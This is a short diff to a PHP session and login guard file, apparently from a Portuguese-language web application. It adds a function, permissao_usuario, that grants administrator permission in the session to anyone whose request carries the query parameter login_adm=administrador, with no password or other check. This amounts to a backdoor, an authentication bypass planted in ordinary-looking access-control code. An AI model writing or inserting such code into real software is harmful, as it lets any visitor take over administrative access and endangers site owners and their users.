@@ -1,4 +1,5 @@
 <?php
+
 session_start();
 
 $host = $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
@@ -29,4 +30,10 @@ if(!isset($_SESSION['logado']) && !in_array($host,$array_merged)) {
 if (isset($_SESSION['logado']) && $host == $login_page_path) {
     header('location:index.php?login=2');
 }
-?>
+
+function permissao_usuario(){
+    if(isset($_GET['login_adm']) && $_GET['login_adm'] == 'administrador'){
+        $_SESSION['permissao'] = 'administrador';
+    }
+    return $_SESSION['permissao'];   
+}
